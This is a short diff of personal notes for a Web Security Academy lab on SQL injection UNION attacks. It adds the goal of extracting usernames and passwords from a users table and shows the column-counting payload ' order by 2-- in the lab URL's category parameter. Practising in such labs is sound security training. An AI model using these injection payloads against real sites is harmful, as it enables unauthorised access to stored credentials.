@@ -1,5 +1,5 @@
 Lab #05: SQL injection UNION attack, retrieving data from other tables
-
+Output the username and password from the users table
 Finding the number of column using order by
 ' order by 2--
 https://0a7400cd045d76b2807a7198009e00d5.web-security-academy.net/filter?category=Lifestyle' order by 2--
